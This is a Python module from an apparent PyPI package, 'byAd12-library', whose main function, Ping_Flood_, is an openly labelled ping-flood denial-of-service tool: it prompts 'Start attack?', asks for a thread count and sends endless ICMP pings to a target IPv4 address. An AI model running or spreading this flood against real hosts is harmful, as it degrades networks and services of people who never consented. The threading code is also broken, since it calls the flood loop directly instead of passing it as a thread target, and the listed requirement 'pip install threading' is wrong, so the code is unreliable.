# byAd12

from ping3 import ping
import threading

##########################################################################################
##########################################################################################

def Ping_Flood_(IPv4):
    ###########################
    def ping_(IPv4):
        r = ping(IPv4)
        if r is None:
            return print(f"[Inactive]\t{r}")
        else:
            return print(f"[Active]\t{r * 1000:.2f} ms")
    ###########################
    def flood_ping(IPv4, i):
        while True:
            ping_(IPv4); i += 1
    ###########################
    if not IPv4:
        return print("IPv4 required to run this function.")
    print(f"Test ping to ({IPv4}): ")
    ping_(IPv4) #- TEST
    i = 0
    #- ASK
    if int(input(f"\nStart attack?\tYes: 1\tNo: 2\tAnswer: ")) == 1:
        HILOS = int(input(f"Threads: "))
        print(f"Starting attack to ({IPv4}):")
        try:
            threads = []
            for _ in range(HILOS):
                t = threading.Thread(target=flood_ping(IPv4, i))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            #-
        except KeyboardInterrupt:
            if i == 0:
                return "Cancelled"
            else:
                return "Stopped"
        except Exception as e:
            return "Error"
    #-
    return "Cancelled"

##########################################################################################
##########################################################################################

def byAd12_Info_():
    return print("""
byAd12-library - v1.2.1

Project:
\tPyPi:    https://pypi.org/project/byAd12-library/
\tInstall: pip install byAd12-library

Author:
\tWebsite: https://byAd12.pages.dev
\tMail:    adgimenezp@gmail.com

Functions:
\tPing_Flood_(IPv4)\n\tSend massive ping (ICMP messages) to a target (Local or a Server) with the IPv4.
\tbyAd12_Info_()\n\tCheck the information about the library.
\tdavid_(text)\n\tAdds 2 dots ("..") to end of the string.

Requiremets:
\tthreading: pip install threading
\tping3:     pip install ping3
""")

##########################################################################################
##########################################################################################

def david_(texto):
    if texto.endswith("..."):
        return print(texto.split(".")[0] + "..")
    elif texto.endswith(".."):
        return print(texto)
    elif texto.endswith("."):
        return print(texto.split(".")[0] + "..")
    else:
        return print(texto + "..")

##########################################################################################
##########################################################################################